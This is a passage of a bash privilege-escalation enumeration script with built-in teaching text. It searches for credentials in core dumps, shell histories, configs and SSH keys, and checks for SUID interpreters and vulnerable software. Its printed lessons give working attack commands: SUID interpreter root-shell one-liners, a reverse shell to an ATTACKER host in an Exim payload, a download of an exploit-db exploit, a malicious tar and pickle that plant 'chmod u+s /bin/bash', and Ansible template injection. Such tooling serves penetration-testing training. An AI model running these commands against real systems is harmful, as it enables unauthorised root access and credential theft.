        teach "    strings core | grep -A 30 'BEGIN.*PRIVATE'"
        teach ""
        teach "  Find environment variables:"
        teach "    strings core | grep '=' | grep -E '^[A-Z_]+=' | head -30"
        teach ""
        teach "  Find command line arguments:"
        teach "    strings core | head -100 | grep '^-'"
        teach ""
        teach "  Find URLs with credentials:"
        teach "    strings core | grep -E '://[^/]*:[^@]*@'"
        teach ""
        teach "WHAT TO LOOK FOR:"
        teach ""
        teach "  Database credentials:"
        teach "    • Connection strings: mysql://user:pass@host/db"
        teach "    • Command args: mysqldump -p'password'"
        teach "    • Config vars: DB_PASSWORD=secret"
        teach ""
        teach "  API tokens:"
        teach "    • Authorization: Bearer <token>"
        teach "    • API_KEY=AKIA..."
        teach "    • X-API-Token: ..."
        teach ""
        teach "  SSH keys:"
        teach "    • -----BEGIN RSA PRIVATE KEY-----"
        teach "    • -----BEGIN OPENSSH PRIVATE KEY-----"
        teach ""
        teach "  Session tokens:"
        teach "    • PHPSESSID=..."
        teach "    • JWT tokens (eyJ...)"
        teach "    • session_id=..."
        teach ""
        teach "  Plaintext passwords:"
        teach "    • From authentication attempts"
        teach "    • From failed login prompts"
        teach "    • From application memory"
        log ""
    fi
    
    # === PHASE 4: CLEAN SUMMARY ===
    log ""
    if [ $found_issues -eq 0 ]; then
        ok "No readable core dumps or crash files detected"
        log ""
        teach "CORE DUMP STATUS:"
        teach "  ✓ No readable crash dumps found"
        teach "  ✓ No core files found in common locations"
        log ""
        
        if [ $core_enabled -eq 0 ]; then
            ok "Core dumping appears to be disabled (ulimit -c = 0)"
        fi
    else
        info "Core dump analysis complete"
        log ""
        teach "═══════════════════════════════════════════════════════════"
        teach "CORE DUMP EXPLOITATION SUMMARY"
        teach "═══════════════════════════════════════════════════════════"
        teach ""
        teach "ANALYSIS WORKFLOW:"
        teach "  1. Find core/crash files (already done above)"
        teach "  2. Use 'file' command to identify format"
        teach "  3. Extract strings: strings corefile > output.txt"
        teach "  4. Search for patterns: grep -i password output.txt"
        teach "  5. Examine with gdb if binary available"
        teach ""
        teach "HIGH-VALUE TARGETS IN MEMORY:"
        teach "  • Database passwords (often plaintext in connections)"
        teach "  • API keys and tokens (from HTTP requests/responses)"
        teach "  • SSH private keys (from ssh-agent or active connections)"
        teach "  • Session cookies (from web applications)"
        teach "  • Environment variables (often contain secrets)"
        teach "  • Command-line arguments (passwords passed as args)"
        teach ""
        teach "WHY THIS WORKS:"
        teach "  Encryption protects data AT REST (on disk)"
        teach "  But data must be DECRYPTED in memory to be used"
        teach "  Core dumps capture memory = capture decrypted secrets"
        teach ""
        teach "REAL-WORLD EXAMPLES:"
        teach "  • Sudo cached password in memory → Core dump → Plaintext"
        teach "  • MySQL -p'pass' crashed → Core dump → Password visible"
        teach "  • Apache SSL key in memory → Core dump → Private key exposed"
        teach "  • SSH-agent key in memory → Core dump → Key extracted"
        teach ""
        teach "DEFENSIVE RECOMMENDATIONS (for admins):"
        teach "  • Disable core dumps: ulimit -c 0 in /etc/security/limits.conf"
        teach "  • Restrict crash directory: chmod 700 /var/crash"
        teach "  • Clear old dumps: rm -rf /var/crash/*"
        teach "  • Use encrypted core dumps (systemd-coredump)"
        teach "  • Review core_pattern permissions"
    fi
}
# === PASSWORD & HASH HUNTING ===
enum_passwords() {
    section "PASSWORD & CREDENTIAL HUNTING"
    
    explain_concept "Credential Hunting" \
        "Passwords and keys are often stored insecurely in config files, scripts, history files, and environment variables." \
        "Developers hardcode credentials for convenience. Admins store passwords in scripts. Users type them in commands. All leave traces. Finding one password often leads to privilege escalation or lateral movement." \
        "Where to look:\n  • .bash_history, .zsh_history\n  • Config files: *.conf, *.config, *.ini\n  • Scripts: *.sh, *.py, *.pl\n  • Database dumps, backup files\n  • Environment variables\n  • /var/www, application configs"
    
    # Check history files
    for histfile in ~/.bash_history ~/.zsh_history ~/.mysql_history ~/.psql_history; do
        if [ -r "$histfile" ]; then
            if grep -iE "password|passwd|pwd|secret|token|key" "$histfile" 2>/dev/null | head -3 | grep -q "."; then
                warn "Found password-related entries in $histfile"
                grep -iE "password|passwd|pwd|secret" "$histfile" 2>/dev/null | head -3 | while read line; do
                    log "  $line"
                done
            fi
        fi
    done
    
    # Check common config locations
    info "Checking common credential locations..."
    
    local cred_locations=(
        "/var/www/html/wp-config.php"
        "/var/www/html/config.php"
        "/.env"
        "/opt/*/config*"
        "/home/*/.config/*"
    )
    
    for pattern in "${cred_locations[@]}"; do
        find $(dirname "$pattern") -name "$(basename "$pattern")" 2>/dev/null | head -5 | while read file; do
            if grep -iE "password|secret|key|token" "$file" 2>/dev/null | head -1 | grep -q "."; then
                warn "Credentials found in: $file"
            fi
        done
    done
    
    # Check for SSH keys
    find /home -name "id_rsa" -o -name "id_ed25519" -o -name "id_ecdsa" 2>/dev/null | while read key; do
        if [ -r "$key" ]; then
            critical "Readable SSH private key: $key - Use for lateral movement"
            warn "Readable SSH private key: $key"
            teach "Try this key for SSH access: ssh -i $key user@target"
        fi
    done
    info "Checking command history for ALL users..."
    while IFS=: read -r username x uid x x homedir shell; do
        if [ $uid -ge 1000 ] && [ -d "$homedir" ]; then
            for histfile in .bash_history .zsh_history .python_history .mysql_history; do
                if [ -r "$homedir/$histfile" ]; then
                    if grep -iE "password|passwd|pwd|secret|token|key|curl.*-u|wget.*password" "$homedir/$histfile" 2>/dev/null | head -5 | grep -q "."; then
                        critical "User $username history contains passwords: $homedir/$histfile"
                        vuln "Command history with credentials for user: $username"
                        grep -iE "password|passwd|pwd|secret|token" "$homedir/$histfile" 2>/dev/null | head -3 | while read line; do
                            log "  $line"
                        done
                    fi
                fi
            done
        fi
    done < /etc/passwd
}
# === SOFTWARE VERSION CHECKING - PRIVESC FOCUS ===
enum_software_versions() {
    section "EXPLOITABLE SOFTWARE VERSIONS"
    
    # === PHASE 1: SILENT SCAN - Only software with KNOWN privesc exploits ===
    local temp_vuln_software="/tmp/.learnpeas_vuln_software_$$"
    local temp_setuid_software="/tmp/.learnpeas_setuid_software_$$"
    local temp_cron_interpreters="/tmp/.learnpeas_cron_interp_$$"
    
    cleanup_version_temps() {
        rm -f "$temp_vuln_software" "$temp_setuid_software" "$temp_cron_interpreters" 2>/dev/null
    }
    trap cleanup_version_temps RETURN
    
    # === CHECK 1: Scripting Languages Used by Root (SUID or Cron) ===
    # Only check if they're actually exploitable (SUID or run by root)
    
    local root_uses_scripts=0
    
    # Check for Python scripts in root's crontab or systemd
    if [ -r /etc/crontab ]; then
        if grep -E "python|\.py" /etc/crontab 2>/dev/null | grep -qv "^#"; then
            root_uses_scripts=1
            
            # Check Python version for known privesc CVEs
            if command -v python3 >/dev/null 2>&1; then
                local py_version=$(python3 --version 2>&1 | grep -oE '[0-9]+\.[0-9]+\.[0-9]+')
                if [ -n "$py_version" ]; then
                    local py_major=$(echo "$py_version" | cut -d. -f1)
                    local py_minor=$(echo "$py_version" | cut -d. -f2)
                    
                    # Python < 3.8 has multiple privesc-related CVEs (tarfile, pickle)
                    if [ "$py_major" -eq 3 ] && [ "$py_minor" -lt 8 ]; then
                        echo "python3|$py_version|tarfile|CVE-2007-4559 - Path traversal in tarfile extraction" >> "$temp_cron_interpreters"
                    fi
                    
                    # Python < 3.7 has pickle RCE (if root script unpickles user data)
                    if [ "$py_major" -eq 3 ] && [ "$py_minor" -lt 7 ]; then
                        echo "python3|$py_version|pickle|Unsafe pickle deserialization" >> "$temp_cron_interpreters"
                    fi
                fi
            fi
            
            # Check for Perl (less common but shellshock-like issues)
            if command -v perl >/dev/null 2>&1; then
                if grep -qE "perl|\.pl" /etc/crontab 2>/dev/null; then
                    local perl_version=$(perl --version 2>/dev/null | grep -oE 'v[0-9]+\.[0-9]+\.[0-9]+' | head -1)
                    if [ -n "$perl_version" ]; then
                        echo "perl|$perl_version|taint|Taint mode bypass opportunities" >> "$temp_cron_interpreters"
                    fi
                fi
            fi
        fi
    fi
    
    # === CHECK 2: SUID Interpreters (Python/Perl/Ruby with SUID bit) ===
    # These are INSTANT root if found
    for interpreter in python python2 python3 perl ruby php node nodejs; do
        local interp_path=$(command -v "$interpreter" 2>/dev/null)
        if [ -n "$interp_path" ] && [ -u "$interp_path" ]; then
            local version=$("$interpreter" --version 2>/dev/null | head -1 || echo "unknown")
            echo "$interpreter|$interp_path|$version" >> "$temp_setuid_software"
        fi
    done
    
    # === CHECK 3: Known Vulnerable SUID Binaries (version-specific) ===
    # Only check binaries that have KNOWN CVEs and are commonly misconfigured
    
    # screen (CVE-2017-5618 if SUID and < 4.5.1)
    if [ -u /usr/bin/screen ] || [ -u /bin/screen ]; then
        local screen_path=$(command -v screen 2>/dev/null)
        if [ -n "$screen_path" ]; then
            local screen_version=$(screen -v 2>&1 | grep -oE '[0-9]+\.[0-9]+\.[0-9]+' | head -1)
            if [ -n "$screen_version" ]; then
                local major=$(echo "$screen_version" | cut -d. -f1)
                local minor=$(echo "$screen_version" | cut -d. -f2)
                local patch=$(echo "$screen_version" | cut -d. -f3)
                
                # screen < 4.5.1 with SUID = CVE-2017-5618
                if [ "$major" -eq 4 ] && [ "$minor" -le 5 ] && [ "$patch" -eq 0 ]; then
                    echo "screen|$screen_version|CVE-2017-5618|SUID screen privilege escalation" >> "$temp_vuln_software"
                fi
            fi
        fi
    fi
    
    # tmux (CVE-2022-47016 if SUID - rare but devastating)
    if [ -u /usr/bin/tmux ] || [ -u /bin/tmux ]; then
        local tmux_path=$(command -v tmux 2>/dev/null)
        if [ -n "$tmux_path" ]; then
            local tmux_version=$(tmux -V 2>&1 | grep -oE '[0-9]+\.[0-9]+' | head -1)
            echo "tmux|$tmux_version|CVE-2022-47016|SUID tmux allows arbitrary command execution" >> "$temp_vuln_software"
        fi
    fi
    
    # exim (if installed and running as root - common mail server privesc)
    if command -v exim >/dev/null 2>&1 || command -v exim4 >/dev/null 2>&1; then
        local exim_cmd=$(command -v exim4 2>/dev/null || command -v exim 2>/dev/null)
        local exim_version=$("$exim_cmd" -bV 2>/dev/null | head -1 | grep -oE '[0-9]+\.[0-9]+\.[0-9]+')
        
        if [ -n "$exim_version" ]; then
            local major=$(echo "$exim_version" | cut -d. -f1)
            local minor=$(echo "$exim_version" | cut -d. -f2)
            
            # Exim < 4.92 has multiple local privesc CVEs
            if [ "$major" -eq 4 ] && [ "$minor" -lt 92 ]; then
                echo "exim|$exim_version|CVE-2019-10149|Local privilege escalation via crafted recipient" >> "$temp_vuln_software"
            fi
        fi
    fi
    
    # === CHECK 4: Automation Tools That Run as Root ===
    # Only if they're actually configured (have config files)
    
    # Ansible (if /etc/ansible exists)
    if [ -d /etc/ansible ] && command -v ansible >/dev/null 2>&1; then
        local ansible_version=$(ansible --version 2>/dev/null | head -1 | grep -oE '[0-9]+\.[0-9]+\.[0-9]+')
        if [ -n "$ansible_version" ]; then
            local major=$(echo "$ansible_version" | cut -d. -f1)
            local minor=$(echo "$ansible_version" | cut -d. -f2)
            
            # Ansible < 2.9 has template injection and privilege escalation CVEs
            if [ "$major" -eq 2 ] && [ "$minor" -lt 9 ]; then
                echo "ansible|$ansible_version|CVE-2019-10206|Template injection leading to RCE" >> "$temp_vuln_software"
            fi
        fi
    fi
    
    # Chef (if /etc/chef exists)
    if [ -d /etc/chef ] && command -v chef-client >/dev/null 2>&1; then
        local chef_version=$(chef-client --version 2>/dev/null | grep -oE '[0-9]+\.[0-9]+\.[0-9]+')
        if [ -n "$chef_version" ]; then
            echo "chef|$chef_version|symlink|Symlink attack during package installation" >> "$temp_vuln_software"
        fi
    fi
    
    # === PHASE 2: CONDITIONAL EDUCATION ===
    local has_findings=0
    [ -s "$temp_vuln_software" ] && has_findings=1
    [ -s "$temp_setuid_software" ] && has_findings=1
    [ -s "$temp_cron_interpreters" ] && has_findings=1
    
    if [ $has_findings -eq 1 ]; then
        log ""
        teach "╔═══════════════════════════════════════════════════════════╗"
        teach "║  SOFTWARE VULNERABILITIES - Why Version Matters          ║"
        teach "╚═══════════════════════════════════════════════════════════╝"
        teach ""
        teach "SCOPE OF THIS CHECK:"
        teach "  This module focuses ONLY on software that:"
        teach "  • Runs as root (cron scripts, systemd services)"
        teach "  • Is SUID (can directly escalate privileges)"
        teach "  • Has KNOWN exploitable CVEs for privilege escalation"
        teach ""
        teach "WHY THESE VULNERABILITIES EXIST:"
        teach "  ✗ Developers prioritize features over security"
        teach "  ✗ Complex codebases (Python, Perl) have subtle bugs"
        teach "  ✗ Admins install and forget (no updates)"
        teach "  ✗ SUID bit on interpreters = massive attack surface"
        teach ""
        teach "EXPLOITATION MODEL:"
        teach "  1. Identify vulnerable software running as root"
        teach "  2. Find how YOU can interact with it (input, files, etc.)"
        teach "  3. Trigger the vulnerability with crafted input"
        teach "  4. Vulnerability executes YOUR code as root"
        log ""
    fi
    
    # === PHASE 3: REPORT FINDINGS ===
    
    # Report SUID Interpreters (CRITICAL - Instant root)
    if [ -s "$temp_setuid_software" ]; then
        critical "SUID INTERPRETERS DETECTED - INSTANT ROOT ACCESS"
        log ""
        
        while IFS='|' read -r interpreter path version; do
            critical "SUID $interpreter: $path (version: $version)"
            vuln "This interpreter can execute arbitrary code as root!"
            log ""
            
            teach "╔═══════════════════════════════════════════════════════════╗"
            teach "║  SUID INTERPRETER - Critical Misconfiguration            ║"
            teach "╚═══════════════════════════════════════════════════════════╝"
            teach ""
            teach "WHAT THIS MEANS:"
            teach "  An interpreter with the SUID bit runs as the file owner (root)."
            teach "  You can write ANY code and it executes as root."
            teach "  This is like giving you sudo with no password."
            teach ""
            teach "WHY THIS IS CATASTROPHIC:"
            teach "  Normal: User writes script → script runs as user"
            teach "  SUID interpreter: User writes script → script runs as ROOT"
            teach ""
            teach "  Example of the mistake:"
            teach "  Admin thinks: 'I'll make python SUID so my script works'"
            teach "  Reality: EVERY python script now runs as root"
            teach ""
            
            case "$interpreter" in
                python*|python)
                    teach "═══════════════════════════════════════════════════════════"
                    teach "INSTANT ROOT - Python SUID Exploitation:"
                    teach "═══════════════════════════════════════════════════════════"
                    teach ""
                    teach "$path -c 'import os; os.setuid(0); os.execl(\"/bin/bash\", \"bash\", \"-p\")'"
                    teach ""
                    teach "What this does:"
                    teach "  1. Python runs with EUID=0 (root) due to SUID bit"
                    teach "  2. os.setuid(0) makes RUID=0 (real user ID becomes root)"
                    teach "  3. os.execl() replaces process with bash"
                    teach "  4. bash -p preserves privileges"
                    teach "  5. You now have a root shell"
                    teach ""
                    teach "Alternative - Create SUID bash for persistence:"
                    teach "  $path -c 'import os; os.chmod(\"/bin/bash\", 0o4755)'"
                    teach "  /bin/bash -p"
                    ;;
                    
                perl)
                    teach "═══════════════════════════════════════════════════════════"
                    teach "INSTANT ROOT - Perl SUID Exploitation:"
                    teach "═══════════════════════════════════════════════════════════"
                    teach ""
                    teach "$path -e 'use POSIX qw(setuid); POSIX::setuid(0); exec \"/bin/bash\", \"-p\";'"
                    teach ""
                    teach "What this does:"
                    teach "  1. Perl runs with SUID privileges"
                    teach "  2. POSIX::setuid(0) sets real UID to 0"
                    teach "  3. exec() spawns bash as root"
                    ;;
                    
                ruby)
                    teach "═══════════════════════════════════════════════════════════"
                    teach "INSTANT ROOT - Ruby SUID Exploitation:"
                    teach "═══════════════════════════════════════════════════════════"
                    teach ""
                    teach "$path -e 'Process::Sys.setuid(0); exec \"/bin/bash\", \"-p\"'"
                    ;;
                    
                php)
                    teach "═══════════════════════════════════════════════════════════"
                    teach "INSTANT ROOT - PHP SUID Exploitation:"
                    teach "═══════════════════════════════════════════════════════════"
                    teach ""
                    teach "$path -r 'posix_setuid(0); system(\"/bin/bash -p\");'"
                    ;;
                    
                node|nodejs)
                    teach "═══════════════════════════════════════════════════════════"
                    teach "INSTANT ROOT - Node.js SUID Exploitation:"
                    teach "═══════════════════════════════════════════════════════════"
                    teach ""
                    teach "$path -e 'process.setuid(0); require(\"child_process\").spawn(\"/bin/bash\", [\"-p\"], {stdio: [0,1,2]})'"
                    ;;
            esac
            
            teach ""
            teach "WHY ADMINS DO THIS:"
            teach "  • Script needs root for ONE operation"
            teach "  • Admin makes interpreter SUID instead of just the script"
            teach "  • Doesn't realize this affects ALL scripts in that language"
            teach ""
            teach "THE SECURITY LESSON:"
            teach "  NEVER make interpreters SUID. Instead:"
            teach "  ✓ Use sudo with specific script path"
            teach "  ✓ Make a compiled wrapper that's SUID"
            teach "  ✓ Use capabilities (cap_setuid) on specific binary"
            log ""
        done < "$temp_setuid_software"
    fi
    
    # Report vulnerable SUID binaries with version-specific exploits
    if [ -s "$temp_vuln_software" ]; then
        critical "VULNERABLE SUID/ROOT SOFTWARE DETECTED"
        log ""
        
        while IFS='|' read -r software version cve description; do
            critical "$software $version - $cve"
            vuln "$description"
            log ""
            
            case "$software" in
                screen)
                    teach "╔═══════════════════════════════════════════════════════════╗"
                    teach "║  CVE-2017-5618 - GNU Screen SUID Privilege Escalation    ║"
                    teach "╚═══════════════════════════════════════════════════════════╝"
                    teach ""
                    teach "WHAT IT IS:"
                    teach "  GNU screen with SUID bit + version < 4.5.1 has a buffer"
                    teach "  overflow in the logfile handling. Allows local privilege"
                    teach "  escalation to root."
                    teach ""
                    teach "WHY IT EXISTS:"
                    teach "  screen allows shared terminal sessions. When creating a log"
                    teach "  file, it doesn't properly validate the filename length."
                    teach "  Attacker can overflow the buffer with a long filename,"
                    teach "  overwriting memory to execute arbitrary code as root."
                    teach ""
                    teach "EXPLOITATION:"
                    teach "  1. Download exploit:"
                    teach "     wget https://www.exploit-db.com/download/41154"
                    teach "  2. Compile:"
                    teach "     gcc 41154.c -o screen_exploit"
                    teach "  3. Run:"
                    teach "     ./screen_exploit"
                    teach "  4. Get root shell"
                    teach ""
                    teach "HOW IT WORKS:"
                    teach "  Exploit creates a malicious logfile path that triggers"
                    teach "  the overflow when screen processes it with SUID privileges."
                    teach ""
                    teach "IMPACT: Any user → Root (if screen is SUID)"
                    ;;
                    
                exim)
                    teach "╔═══════════════════════════════════════════════════════════╗"
                    teach "║  CVE-2019-10149 - Exim Mail Server Privilege Escalation  ║"
                    teach "╚═══════════════════════════════════════════════════════════╝"
                    teach ""
                    teach "WHAT IT IS:"
                    teach "  Exim mail server < 4.92 allows remote command execution"
                    teach "  via crafted recipient addresses. Since exim runs as root,"
                    teach "  this leads to immediate privilege escalation."
                    teach ""
                    teach "WHY IT EXISTS:"
                    teach "  Exim doesn't properly validate recipient email addresses"
                    teach "  in certain configurations. Attacker can inject shell"
                    teach "  commands that get executed when exim processes the mail."
                    teach ""
                    teach "EXPLOITATION:"
                    teach "  1. Check if exim is vulnerable:"
                    teach "     exim --version"
                    teach "  2. Download exploit (if local access):"
                    teach "     searchsploit exim 4.8"
                    teach "  3. Craft malicious recipient:"
                    teach "     \${run{/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'}}"
                    teach "  4. Trigger via local mail or SMTP"
                    teach ""
                    teach "LOCAL EXPLOITATION:"
                    teach "  If you can send local mail as unprivileged user:"
                    teach "  echo 'test' | exim -be '\${run{id}}'"
                    teach ""
                    teach "IMPACT: Remote/Local code execution as root"
                    ;;
                    
                ansible)
                    teach "╔═══════════════════════════════════════════════════════════╗"
                    teach "║  Ansible Privilege Escalation - Template Injection       ║"
                    teach "╚═══════════════════════════════════════════════════════════╝"
                    teach ""
                    teach "WHAT IT IS:"
                    teach "  Ansible < 2.9 has template injection vulnerabilities."
                    teach "  If you can control playbook content or variables, you"
                    teach "  can inject Jinja2 template code that executes as root."
                    teach ""
                    teach "WHY IT EXISTS:"
                    teach "  Ansible uses Jinja2 templating. If user-controlled data"
                    teach "  reaches template rendering without sanitization, attacker"
                    teach "  can inject {{ }} expressions that execute Python code."
                    teach ""
                    teach "EXPLOITATION:"
                    teach "  If you can modify playbooks or inventory files:"
                    teach ""
                    teach "  1. Inject template code in playbook:"
                    teach "     - name: Pwn"
                    teach "       command: \"{{ lookup('pipe', 'chmod u+s /bin/bash') }}\""
                    teach ""
                    teach "  2. Or in inventory variables:"
                    teach "     ansible_host={{ lookup('pipe', 'id > /tmp/pwned') }}"
                    teach ""
                    teach "  3. Wait for ansible-playbook to run"
                    teach "  4. Code executes as root"
                    teach ""
                    teach "CHECK FOR WRITABLE PLAYBOOKS:"
                    teach "  find /etc/ansible -type f -writable 2>/dev/null"
                    ;;
            esac
            log ""
        done < "$temp_vuln_software"
    fi
    
    # Report interpreters used by root cron with known issues
    if [ -s "$temp_cron_interpreters" ]; then
        warn "INTERPRETERS USED BY ROOT SCRIPTS - Potential Issues"
        log ""
        
        while IFS='|' read -r interpreter version vuln_type description; do
            warn "$interpreter $version used by root cron/systemd"
            info "Potential issue: $description"
            log ""
            
            case "$vuln_type" in
                tarfile)
                    teach "╔═══════════════════════════════════════════════════════════╗"
                    teach "║  Python tarfile Path Traversal (CVE-2007-4559)           ║"
                    teach "╚═══════════════════════════════════════════════════════════╝"
                    teach ""
                    teach "WHAT IT IS:"
                    teach "  Python's tarfile module doesn't sanitize paths during"
                    teach "  extraction. If a root script extracts a tar archive you"
                    teach "  control, you can write files outside the extraction dir."
                    teach ""
                    teach "EXPLOITATION SCENARIO:"
                    teach "  1. Root script does: tarfile.open('backup.tar').extractall()"
                    teach "  2. You create malicious tar with path: ../../../etc/cron.d/pwn"
                    teach "  3. Script extracts your tar as root"
                    teach "  4. Your cron job gets written to /etc/cron.d/"
                    teach "  5. Cron executes your job as root"
                    teach ""
                    teach "CREATE MALICIOUS TAR:"
                    teach "  echo '* * * * * root chmod u+s /bin/bash' > pwn"
                    teach "  tar -cf evil.tar --transform='s|pwn|../../../etc/cron.d/pwn|' pwn"
                    teach ""
                    teach "PLACE TAR WHERE ROOT SCRIPT WILL PROCESS IT:"
                    teach "  • /tmp/*.tar (if script processes /tmp)"
                    teach "  • /var/backups/*.tar"
                    teach "  • Anywhere the script looks for tar files"
                    ;;
                    
                pickle)
                    teach "╔═══════════════════════════════════════════════════════════╗"
                    teach "║  Python pickle Deserialization RCE                       ║"
                    teach "╚═══════════════════════════════════════════════════════════╝"
                    teach ""
                    teach "WHAT IT IS:"
                    teach "  Python's pickle module serializes objects. If a root"
                    teach "  script unpickles data you control, you can execute"
                    teach "  arbitrary Python code as root."
                    teach ""
                    teach "WHY IT'S DANGEROUS:"
                    teach "  pickle.load() will execute ANY code embedded in the"
                    teach "  serialized data. There's no way to safely unpickle"
                    teach "  untrusted data."
                    teach ""
                    teach "EXPLOITATION:"
                    teach "  1. Find root script that does: pickle.load(file)"
                    teach "  2. Create malicious pickle file:"
                    teach ""
                    teach "  import pickle, os"
                    teach "  class Exploit:"
                    teach "      def __reduce__(self):"
                    teach "          return (os.system, ('chmod u+s /bin/bash',))"
                    teach "  with open('evil.pkl', 'wb') as f:"
                    teach "      pickle.dump(Exploit(), f)"
                    teach ""
                    teach "  3. Place evil.pkl where root script will unpickle it"
                    teach "  4. When unpickled, os.system runs as root"
                    ;;
                    
                taint)
                    teach "╔═══════════════════════════════════════════════════════════╗"
                    teach "║  Perl Taint Mode - Security Feature Bypass              ║"
                    teach "╚═══════════════════════════════════════════════════════════╝"
                    teach ""
                    teach "WHAT IT IS:"
                    teach "  Perl has 'taint mode' (-T flag) that marks untrusted data."
                    teach "  However, there are ways to 'launder' tainted data and"
                    teach "  bypass these protections."
                    teach ""
                    teach "EXPLOITATION:"
                    teach "  If root Perl script uses taint mode but processes your input:"
                    teach "  • Look for regex matches that 'clean' data"
                    teach "  • These captures become untainted and can be used in system()"
                    teach "  • Inject shell metacharacters in cleaned portions"
                    teach ""
                    teach "EXAMPLE:"
                    teach "  if (\$input =~ /^([\\w.-]+)\$/) {  # Looks safe"
                    teach "      system(\"/bin/process \$1\");    # Actually exploitable"
                    teach "  }"
                    teach ""
                    teach "  Input: 'file.txt; chmod u+s /bin/bash;'"
                    teach "  The \\w.- regex might allow semicolons in some contexts"
                    ;;
            esac
            log ""
        done < "$temp_cron_interpreters"
        
        teach "═══════════════════════════════════════════════════════════"
        teach "FINDING ROOT SCRIPTS THAT USE THESE INTERPRETERS:"
        teach "═══════════════════════════════════════════════════════════"
        teach ""
        teach "1. Check cron jobs:"
        teach "   grep -r 'python\\|perl' /etc/cron*"
        teach ""
        teach "2. Check systemd services:"
        teach "   grep -r 'ExecStart.*python' /etc/systemd/system/ /lib/systemd/system/"
        teach ""
        teach "3. Find scripts run by root:"
        teach "   find /usr/local/bin /opt -name '*.py' -o -name '*.pl' | while read script; do"
        teach "       [ -r \"\$script\" ] && head -1 \"\$script\" | grep -q '^#!' && echo \"\$script\""
        teach "   done"
        teach ""
        teach "4. Check what those scripts do:"
        teach "   • Do they process files from /tmp?"
        teach "   • Do they extract archives?"
        teach "   • Do they deserialize data?"
        teach "   • Can you control their input?"
        log ""
    fi
    
    # === PHASE 4: CLEAN SUMMARY ===
    if [ $has_findings -eq 0 ]; then
        ok "No exploitable software versions detected"
        log ""
        teach "WHAT WAS CHECKED:"
        teach "  ✓ SUID interpreters (Python, Perl, Ruby, PHP, Node)"
        teach "  ✓ SUID binaries with known CVEs (screen, tmux)"
        teach "  ✓ Root services with exploit history (exim, ansible)"
        teach "  ✓ Interpreters used by root with dangerous features"
        teach ""
        teach "WHAT WAS NOT CHECKED:"
        teach "  ✗ General software inventory (not privesc-relevant)"
        teach "  ✗ Desktop applications"
        teach "  ✗ Libraries without direct exploit path"
    else
        log ""
        info "Software vulnerability scan complete"
        log ""
        teach "═══════════════════════════════════════════════════════════"
        teach "EXPLOITATION PRIORITY:"
        teach "═══════════════════════════════════════════════════════════"
        teach ""
        teach "1. SUID INTERPRETERS (CRITICAL)"
        teach "   → Instant root, no exploit needed, just run code"
        teach ""
        teach "2. SUID BINARIES WITH CVEs"
        teach "   → Download exploit, compile, run → root"
        teach ""
        teach "3. ROOT SERVICES WITH KNOWN BUGS"
        teach "   → Requires finding input vector, then exploit"
        teach ""
        teach "4. INTERPRETERS USED BY ROOT"
        teach "   → Need to control script input, then inject payload"
        teach ""
        teach "REMEMBER:"
        teach "  Version alone doesn't guarantee exploitability."
        teach "  You need:"
        teach "  • Software running with elevated privileges (SUID/root)"
        teach "  • A way to trigger the vulnerability (input, files, network)"
        teach "  • The vulnerability must lead to code execution"
    fi
}
# === INTERESTING FILES ===
enum_interesting_files() {
    section "INTERESTING FILE DISCOVERY"
    
    # PHASE 1: SILENT SCAN - Collect high-value findings only
    local temp_suid_unusual="/tmp/.learnpeas_suid_unusual_$$"
    local temp_recent_sensitive="/tmp/.learnpeas_recent_sensitive_$$"
    local temp_cred_files="/tmp/.learnpeas_cred_files_$$"
    local temp_config_readable="/tmp/.learnpeas_config_readable_$$"
    
    cleanup_interesting_temps() {
        rm -f "$temp_suid_unusual" "$temp_recent_sensitive" "$temp_cred_files" "$temp_config_readable" 2>/dev/null
    }
    trap cleanup_interesting_temps RETURN
    
    # === CHECK 1: SUID/SGID in unusual locations (high priority) ===
    info "Scanning for SUID/SGID binaries in unusual locations..."
    warn "Press ENTER to skip this check and continue to next enumeration."
    
    local skip_suid=false
    local suid_locations=("/home" "/tmp" "/var/tmp" "/opt" "/usr/local/bin" "/usr/local/sbin")
    local total_suid=${#suid_locations[@]}
    local current_suid=0
    
    # Whitelist of known legitimate SUID locations to reduce false positives
    local legit_suid_patterns="passwd|sudo|su|mount|umount|ping|fusermount"
    
    for location in "${suid_locations[@]}"; do
        # Check for skip
        if read -t 0.01; then
            skip_suid=true
            echo ""
            info "Skipping SUID search..."
            break
        fi
        
        current_suid=$((current_suid + 1))
        echo -ne "\r[INFO] Searching $location... ($current_suid/$total_suid) - Press ENTER to skip" >&2
        
        [ ! -d "$location" ] && continue
        
        find "$location" -type f \( -perm -4000 -o -perm -2000 \) 2>/dev/null | while read suid_file; do
            local basename=$(basename "$suid_file")
            # Skip if it's a known legitimate binary
            if ! echo "$basename" | grep -qE "$legit_suid_patterns"; then
                echo "$suid_file" >> "$temp_suid_unusual"
            fi
        done
    done
    echo -ne "\r\033[K" >&2
    
    # === CHECK 2: Recently modified files in sensitive locations (last 48h) ===
    if ! $skip_suid; then
        info "Scanning recently modified files in sensitive locations..."
        warn "Press ENTER to skip this check."
        
        local skip_recent=false
        local recent_dirs=("/etc" "/root" "/var/www" "/opt")
        local total_recent=${#recent_dirs[@]}
        local current_recent=0
        
        for location in "${recent_dirs[@]}"; do
            # Check for skip
            if read -t 0.01; then
                skip_recent=true
                echo ""
                info "Skipping recent file search..."
                break
            fi
            
            current_recent=$((current_recent + 1))
            echo -ne "\r[INFO] Checking $location... ($current_recent/$total_recent) - Press ENTER to skip" >&2
            
            [ ! -d "$location" ] && continue
            
            # Only flag files modified in last 48 hours in sensitive dirs
            find "$location" -type f -mtime -2 2>/dev/null | while read recent_file; do
                # Filter to only config files, scripts, or executables
                if echo "$recent_file" | grep -qE "\.(conf|config|sh|py|pl|rb|php|yml|yaml|xml|ini|json)$|/bin/|/sbin/"; then
                    echo "$recent_file" >> "$temp_recent_sensitive"
                fi
            done
        done
        echo -ne "\r\033[K" >&2
    fi
    
    # === CHECK 3: Credential files (specific patterns only) ===
    if ! $skip_suid && ! ${skip_recent:-false}; then
        info "Scanning for credential files..."
        warn "Press ENTER to skip this check."
        
        local skip_creds=false
        local cred_dirs=("/home" "/var/www" "/opt" "/root")
        local total_creds=${#cred_dirs[@]}
        local current_creds=0
        
        # High-value patterns only (not just "password" in filename)
        local cred_patterns=(
            "*.key"
            "*.pem"
            "*.ppk"
            "*secret*"
            "*credential*"
            ".htpasswd"
            "*.pgpass"
            ".my.cnf"
            ".netrc"
        )
        
        for location in "${cred_dirs[@]}"; do
            # Check for skip
            if read -t 0.01; then
                skip_creds=true
                echo ""
                info "Skipping credential file search..."
                break
            fi
            
            current_creds=$((current_creds + 1))
